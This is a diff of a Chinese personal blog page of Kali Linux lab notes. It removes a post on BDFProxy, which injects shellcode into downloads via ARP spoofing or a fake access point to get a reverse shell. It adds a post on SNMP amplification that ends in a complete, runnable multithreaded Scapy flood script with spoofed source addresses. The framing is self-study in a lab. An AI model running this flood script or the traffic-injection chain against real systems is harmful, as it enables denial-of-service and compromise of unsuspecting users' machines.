@@ -240,278 +240,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%9B%9B)%EF%BC%9ABDFProxy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%9B%9B)%EF%BC%9ABDFProxy/" itemprop="url">Kali Linux笔记(九十四)：BDFProxy</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T12:53:34+08:00">
-                2020-02-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  557 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Bdfproxy"><a href="#1-Bdfproxy" class="headerlink" title="1. Bdfproxy"></a>1. Bdfproxy</h4><ul>
-<li>Bdfproxy(mitmproxy)<ul>
-<li>基于流量劫持动态注入shellcode（ARP spoof、DNS spoof、Fake AP）</li>
-</ul>
-</li>
-<li>补充内容<ul>
-<li>全站HTTPS防注入（微软每个补丁都带马）</li>
-<li>PE文件证书签名可被清除</li>
-<li>PE Header -&gt; Optional Header -&gt; Certificate Table（Address and size）<ul>
-<li>全部用0覆盖</li>
-<li>BDF默认清除数字签名</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></li>
-<li>▲ 2020.2.15 BDFProxy已不再受支持</li>
-<li>▲ 2020.2.15 BDFProxy的链接<a href="https://github.com/secretsquirrel/BDFProxy.git" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy.git</a></li>
-<li>▲ 2020.2.15 BDFProxy的模块导入存在问题</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=9336aWJqiZjtaArClI5zv5GF7qvZA6KpPHKRugRf2TAOe6D-oobV0bvsV0xCtK4XB0Df3zGDAsxanUdAKP_qoQZk3XTZaTI_o29Y-y6yLsYAgqMxGEGji0QUAH33O9OvIQYprCA598ZfaA&file_name=/Josh%20and%20Mark%20Russinovich.PNG" alt="Josh and Mark Russionovich"></p>
-<h4 id="2-bdfproxy–ARP-spoof"><a href="#2-bdfproxy–ARP-spoof" class="headerlink" title="2. bdfproxy–ARP spoof"></a>2. bdfproxy–ARP spoof</h4><ul>
-<li>Kali<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li><strong><code>🔺命令：apt-get install mitmproxy,backdoor-factory,bdfproxy</code></strong></li>
-<li><strong><code>🔺命令：sysctl -w net.ipv4.ip_forward=1</code></strong> </li>
-<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 80/443 -j REDIRECT --to-ports 8080</code></strong></li>
-<li><strong><code>🔺命令：iptables -L</code></strong>（查看防火墙转发规则）</li>
-<li><strong><code>🔺命令：vi /etc/bdfproxy/bdfproxy.cfg</code></strong> <ul>
-<li>proxyMode = transparent</li>
-<li>HOST = Kali的IP（所有的HOST需要修改）</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：bdfproxy</code></strong>（生成一个rc文件）</li>
-<li><strong><code>🔺命令：msfdb init</code></strong></li>
-<li><strong><code>🔺命令：msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</code></strong><ul>
-<li><strong><code>🔺命令：jobs</code></strong></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：arpspoof -i eth0 -t Window7的IP Kali的IP</code></strong></li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li><strong><code>🔺命令：ipconfig</code></strong>查看IP地址</li>
-<li><strong><code>🔺命令：arp -a</code></strong>查看网关MAC地址</li>
-<li>在Kali欺骗之后，再次<strong><code>🔺命令：arp -a</code></strong>查看MAC地址</li>
-<li>网页访问Putty官网下载putty</li>
-<li>双击下载的putty</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>查看流量日志是否注入成功</li>
-<li>在win7开启putty后，是否有反弹的shell</li>
-<li><strong><code>🔺命令：session -i 1</code></strong></li>
-<li><strong><code>🔺命令：shell</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="3-bdfproxy–Fack-AP"><a href="#3-bdfproxy–Fack-AP" class="headerlink" title="3. bdfproxy–Fack AP"></a>3. bdfproxy–Fack AP</h4><ul>
-<li>▲ 2020.2.15 因无无线网卡，此实验暂无完成</li>
-<li>Mana创建Fack AP</li>
-<li>Bdfproxy代理注入代码</li>
-<li>Msf侦听反弹shell</li>
-<li>Kali<ul>
-<li><strong><code>🔺命令：apt-get install mana-toolkit</code></strong></li>
-<li><strong><code>🔺命令：reboot</code></strong> </li>
-<li><strong><code>🔺命令：vi /etc/mana-toolkit/hostapd-mana.conf</code></strong><ul>
-<li>修改无线SSID名称 → kfc-free</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</code></strong><ul>
-<li>▲ 需要插无线网卡</li>
-<li>修改phy的名称为插入的无线网卡设备号名称</li>
-<li>清空iptables的规则</li>
-<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80/443 -j REDIRECT --to-port 8080</code></strong></li>
-<li><strong><code>🔺命令：./mana.sh</code></strong>（可能需要多次重启）</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：vi /etc/bdfproxy/bdfproxy.cfg</code></strong> <ul>
-<li>proxyMode = transparent</li>
-<li>HOST = Kali的IP（所有的HOST需要修改）</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：bdfproxy</code></strong>（生成一个rc文件）</li>
-<li><strong><code>🔺命令：msfdb init</code></strong></li>
-<li><strong><code>🔺命令：msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</code></strong><ul>
-<li><strong><code>🔺命令：jobs</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>安装无线连接驱动（需插入无线网卡），连接wifi（kfc-free）</li>
-<li>上网尝试</li>
-</ul>
-</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=1386ldfYFKX89GHYbJgsh34v1abCDXFs2nnTCpjfES3apTdZwpB7LzjPN84NiQWfUijXC1U7QrA_p2Uk40T8U4pgG-uzbWwn2GEWRaDbj-RKy1l9npfl9Q&file_name=/Fake%20AP.PNG" alt="Fack AP"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%89)%EF%BC%9ABackdoor-factory/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2980,11 +2708,258 @@
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%9B%9B)%EF%BC%9ADoS--SNMP%E6%94%BE%E5%A4%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%9B%9B)%EF%BC%9ADoS--SNMP%E6%94%BE%E5%A4%A7/" itemprop="url">Kali Linux笔记(八十四)：DoS--SNMP放大</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-10T21:19:01+08:00">
+                2020-02-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  660 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-SNMP放大攻击"><a href="#1-SNMP放大攻击" class="headerlink" title="1. SNMP放大攻击"></a>1. SNMP放大攻击</h4><ul>
+<li>简单网络管理协议（▲ 实际中主要运用为网络设备的监视）<ul>
+<li>Simple Network Management Protocol</li>
+<li>服务端口UDP 161/162</li>
+<li>▲ 主动监控 → 被管理设备161端口，被动监控 → 管理设备162端口</li>
+<li>管理站（manager/客户端）、被管理设备（agent/服务端）</li>
+<li>管理信息数据库（MIB）是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象</li>
+<li>每一个节点都有一个对象标识符（OID）来唯一的标识</li>
+<li>IETF定义标准的MIB库/厂家自定义MIB库</li>
+</ul>
+</li>
+<li>攻击原理<ul>
+<li>请求流量小，查询结果返回流量大</li>
+<li>结合伪造源地址实现攻击</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-Scapy构造攻击数据包"><a href="#2-Scapy构造攻击数据包" class="headerlink" title="2. Scapy构造攻击数据包"></a>2. Scapy构造攻击数据包</h4><ul>
+<li>Window Server 2003<ul>
+<li>安装SNMP服务器（Win+R → appwiz.cpl → 更改或添加程序 → 管理和监控工具 → 简单网络管理协议SNMP，可能需要光盘）<ul>
+<li>Win+R → services.msc → SNMP Service → 代理 → 服务全选</li>
+<li>Win+R → services.msc → SNMP Service → 安全 → 团体（Community）</li>
+<li>添加 → 团队权限（只读）、团队名称（asd）</li>
+<li>接受来自任何主机的SNMP数据包</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址，网卡模式为Bridge方式</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>IP头构造<ul>
+<li>i=IP()</li>
+<li>i.dst=”Window Server 2003的IP地址”</li>
+<li>i.display()</li>
+</ul>
+</li>
+<li>UDP头构造<ul>
+<li>u=udp()</li>
+<li>u.dport=161</li>
+<li>u.sport=161</li>
+<li>u.display()</li>
+</ul>
+</li>
+<li>SNMP头构造<ul>
+<li>s=SNMP()</li>
+<li>s.community=”asd”</li>
+<li>s.display()</li>
+</ul>
+</li>
+<li>SNMP内容构造<ul>
+<li>b=SNMPbulk() </li>
+<li>b.display() </li>
+<li>b.max_repetitions=100（修改此数可增大回包数据大小）</li>
+<li>b.varbindlist=[SNMPvarbind(oid=ASN1_OID(‘1.3.6.1.2.1.1’)),SNMPvarbind(oid=ASN1_OID(‘1.3.6.1.2.1.19.1.3’))] </li>
+</ul>
+</li>
+<li>拼接数据<ul>
+<li>s.PDU=b </li>
+<li>s.display()</li>
+</ul>
+</li>
+<li>发送数据包<ul>
+<li>r= (i/u/s)</li>
+<li>r.display()</li>
+<li>Sr1(r)</li>
+</ul>
+</li>
+<li>▲ Kali开启Wireshark抓包，监听Kali的IP地址，查看返回的数据包的大小（出现分段数据包）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 6:</span><br><span class="line">    print &quot;用法：./dns_flood.py [利用的IP地址] [攻击的IP地址] [回包数据大小] [团体] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./dns_flood.py 1.1.1.1 1.1.1.2 100 asd 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">tar = str(sys.argv[2])</span><br><span class="line">datapacket = int(sys.argv[3])</span><br><span class="line">person = str(sys.argv[4])</span><br><span class="line">threads = int(sys.argv[5])</span><br><span class="line"></span><br><span class="line">print &quot;正在执行 SNMP Flood 攻击，按 Ctrl+C 停止攻击&quot;</span><br><span class="line">def snmpflood(target,datapacket,person,tar):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(dst=target,src=tar)/UDP(sport=x,dport=161)/SNMP(community=person,PDU=SNMPbulk(max_repetitions=datapacket,varbindlist=[SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.1&apos;)),SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.19.1.3&apos;))])),verbose=0)</span><br><span class="line"></span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(snmpflood,(target,datapacket,person,tar))</span><br><span class="line"></span><br><span class="line">while 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=6f7eEyOilZlSnDdl_8LBdW225mV-Lmr7XWu_u-kgOVcKC1uaDnPW8Nu70JJ59mtD4QHd_sAqLzjoBBYLA_kk4IZ9D5Q_Db1xbIZ9nCjgkNSAU0mNL8o6Ljcppw&file_name=/SNMP%E6%94%BE%E5%A4%A7.PNG" alt="SNMP放大攻击"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/7/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/9/">Next</a>
+    <a class="extend prev" rel="prev" href="/page/7/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/9/">Next</a>
   </nav>
 
 
@@ -3034,7 +3009,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">171</span>
+                  <span class="site-state-item-count">168</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3141,7 +3116,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">154.7k</span>
+    <span title="Site words total count">152.3k</span>
   
 </div>
 
